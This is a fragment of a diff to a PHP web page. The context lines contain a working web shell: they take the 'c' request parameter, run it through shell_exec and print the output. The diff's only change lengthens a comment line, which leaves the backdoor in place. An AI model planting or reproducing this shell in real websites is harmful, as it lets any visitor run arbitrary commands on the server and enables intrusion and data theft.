@@ -14,7 +14,7 @@ $c = $_REQUEST['c'];
 $output = shell_exec("$c");
 echo "<pre>$output</pre>\n";
 }
-  ////
+  ////////
 ?>
 </BODY>
 </HTML>
